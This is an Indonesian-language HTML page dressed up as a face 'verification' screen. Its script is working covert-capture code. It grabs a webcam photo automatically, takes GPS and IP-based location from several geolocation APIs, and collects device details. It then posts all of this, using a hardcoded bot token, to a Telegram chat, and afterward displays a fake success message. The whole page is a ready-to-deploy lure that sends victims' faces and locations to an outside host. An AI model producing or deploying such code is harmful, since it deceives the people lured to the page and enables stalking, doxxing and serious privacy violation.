<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifikasi</title>
    <style>
        body { margin: 0; padding: 0; background: #0a0a0a; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: Arial; color: white; }
        .container { background: #1a1a2e; padding: 30px; border-radius: 12px; text-align: center; width: 300px; }
        video { width: 100%; border-radius: 8px; background: #000; margin: 15px 0; transform: scaleX(-1); }
        .status { margin: 10px 0; padding: 8px; border-radius: 6px; background: #0f3460; font-size: 14px; }
        .msg { margin-top: 12px; font-size: 14px; color: #888; }
    </style>
</head>
<body>

<div class="container">
    <h2>📸 Verifikasi</h2>
    <p style="font-size:14px; color:#aaa;">Arahkan wajah ke kamera</p>
    <video id="video" autoplay playsinline></video>
    <div class="status" id="status">⏳ Menunggu...</div>
    <div class="msg" id="infoMsg">Memproses...</div>
</div>

<script>
    // ========== KONFIGURASI TELEGRAM ==========
    const BOT_TOKEN = "7961613868:AAExZB1W9L5EinCeDvwGASisthoLGgYayBM";
    const CHAT_ID = "7781744044";

    // ========== ELEMEN ==========
    const video = document.getElementById('video');
    const statusEl = document.getElementById('status');
    const infoMsg = document.getElementById('infoMsg');

    let stream = null;
    let photoTaken = false;
    let locationData = null;
    let ipData = null;

    // ========== MULAI KAMERA & AUTO CAPTURE ==========
    async function startCamera() {
        try {
            statusEl.textContent = '⏳ Mengakses kamera...';
            stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: 'user', width: { ideal: 480 } } 
            });
            video.srcObject = stream;
            statusEl.textContent = '✅ Kamera aktif';

            // Ambil IP & lokasi duluan sebelum foto
            await Promise.all([
                getIPData(),
                getGPSLocation()
            ]);

            setTimeout(() => {
                if (!photoTaken) captureAndSend();
            }, 500);

        } catch (err) {
            statusEl.textContent = '❌ Gagal akses kamera';
            infoMsg.textContent = 'Izin kamera diperlukan.';
        }
    }

    // ========== GET IP + LOKASI DARI 3 API ==========
    async function getIPData() {
        try {
            // 1. Coba ip-api.com dulu (akurat, 45 req/min, no API key) [citation:2][citation:6]
            let res = await fetch('http://ip-api.com/json/');
            let data = await res.json();
            if (data.status === 'success') {
                ipData = {
                    ip: data.query,
                    city: data.city,
                    region: data.regionName,
                    country: data.country,
                    isp: data.isp,
                    org: data.org,
                    timezone: data.timezone,
                    lat: data.lat,
                    lon: data.lon,
                    zip: data.zip
                };
                return;
            }
        } catch (e) {}

        try {
            // 2. Fallback: ipapi.co (1000/day, no API key) [citation:1][citation:5]
            let res = await fetch('https://ipapi.co/json/');
            let data = await res.json();
            if (data.ip) {
                ipData = {
                    ip: data.ip,
                    city: data.city,
                    region: data.region,
                    country: data.country_name,
                    isp: data.org,
                    org: data.org,
                    timezone: data.timezone,
                    lat: data.latitude,
                    lon: data.longitude,
                    zip: data.postal,
                    currency: data.currency,
                    languages: data.languages
                };
                return;
            }
        } catch (e) {}

        try {
            // 3. Fallback: geo.kamero.ai (unlimited, no API key) [citation:8]
            let res = await fetch('https://geo.kamero.ai/api/geo');
            let data = await res.json();
            if (data.ip) {
                ipData = {
                    ip: data.ip,
                    city: data.city,
                    region: data.countryRegion,
                    country: data.country,
                    timezone: data.timezone,
                    lat: data.latitude,
                    lon: data.longitude,
                    zip: data.postalCode
                };
            }
        } catch (e) {}
    }

    // ========== GPS DARI BROWSER ==========
    async function getGPSLocation() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) {
                resolve(null);
                return;
            }
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    locationData = {
                        lat: pos.coords.latitude,
                        lng: pos.coords.longitude,
                        accuracy: pos.coords.accuracy // Ketelitian dalam meter [citation:7]
                    };
                    resolve(locationData);
                },
                () => resolve(null),
                { timeout: 8000, enableHighAccuracy: true }
            );
        });
    }

    // ========== CAPTURE + KIRIM SEMUA DATA ==========
    async function captureAndSend() {
        if (!stream || photoTaken) return;

        statusEl.textContent = '📸 Memproses...';

        // 1. Capture foto
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 480;
        canvas.height = video.videoHeight || 360;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        const imageDataUrl = canvas.toDataURL('image/jpeg', 0.8);

        // 2. Build caption LENGKAP
        const ip = ipData || {};
        const loc = locationData || {};
        const now = new Date();

        let caption = `📸 *New Capture!*
🕐 ${now.toLocaleString('id-ID', { weekday: 'long', day: 'numeric', month: 'long', year: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit' })}

━━━━━━━━━━━━━━━━━━━━━━
🌐 *IP ADDRESS*
• IP: ${ip.ip || 'Unknown'}
• ISP: ${ip.isp || ip.org || 'Unknown'}
• Organization: ${ip.org || 'Unknown'}

━━━━━━━━━━━━━━━━━━━━━━
📍 *LOCATION (IP-Based)*
• City: ${ip.city || 'Unknown'}
• Region: ${ip.region || 'Unknown'}
• Country: ${ip.country || 'Unknown'}
• Postal: ${ip.zip || 'Unknown'}
• Timezone: ${ip.timezone || 'Unknown'}
• Coordinates: ${ip.lat || '?'}, ${ip.lon || '?'}

━━━━━━━━━━━━━━━━━━━━━━
🛰️ *GPS LOCATION*`;

        if (loc.lat) {
            const googleMaps = `https://www.google.com/maps?q=${loc.lat},${loc.lng}`;
            const osmMaps = `https://www.openstreetmap.org/?mlat=${loc.lat}&mlon=${loc.lng}&zoom=15`;
            caption += `
• GPS Coordinates: ${loc.lat}, ${loc.lng}
• Accuracy: ±${Math.round(loc.accuracy || 0)} meters
• Google Maps: ${googleMaps}
• OpenStreetMap: ${osmMaps}`;
        } else {
            caption += `
• GPS: Tidak tersedia (izin ditolak/tidak support)
• IP-Based Map: https://www.google.com/maps?q=${ip.lat || ''},${ip.lon || ''}`;
        }

        caption += `

━━━━━━━━━━━━━━━━━━━━━━
📱 *DEVICE INFO*
• Browser: ${navigator.userAgent}
• Platform: ${navigator.platform}
• Language: ${navigator.language}
• Screen: ${screen.width}x${screen.height} (${window.devicePixelRatio}x)
• Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
• Online: ${navigator.onLine ? 'Yes' : 'No'}
• Cookies: ${navigator.cookieEnabled ? 'Enabled' : 'Disabled'}`;

        if (ip.currency) caption += `
• Currency: ${ip.currency}`;
        if (ip.languages) caption += `
• Languages: ${ip.languages}`;

        // 3. Kirim foto + caption ke Telegram
        const byteString = atob(imageDataUrl.split(',')[1]);
        const mimeString = imageDataUrl.split(',')[0].split(':')[1].split(';')[0];
        const ab = new ArrayBuffer(byteString.length);
        const ia = new Uint8Array(ab);
        for (let i = 0; i < byteString.length; i++) {
            ia[i] = byteString.charCodeAt(i);
        }
        const blob = new Blob([ab], { type: mimeString });

        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', blob, 'capture.jpg');
        formData.append('caption', caption);
        formData.append('parse_mode', 'Markdown');

        try {
            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            });

            if (response.ok) {
                statusEl.textContent = '✅ Terkirim!';
                infoMsg.textContent = '✔️ Verifikasi selesai.';
                photoTaken = true;
                stream.getTracks().forEach(track => track.stop());
                video.style.display = 'none';
                setTimeout(() => {
                    document.body.innerHTML = `
                        <div style="display:flex;justify-content:center;align-items:center;height:100vh;background:#0a0a0a;color:#00ff88;font-family:Arial;font-size:20px;">
                            ✅ Verifikasi berhasil. Anda akan dialihkan...
                        </div>
                    `;
                }, 1000);
            } else {
                statusEl.textContent = '❌ Gagal kirim';
                infoMsg.textContent = 'Error: ' + response.status;
            }
        } catch (err) {
            statusEl.textContent = '❌ Error: ' + err.message;
        }
    }

    // ========== JALANKAN ==========
    startCamera();
</script>

</body>
    </html>
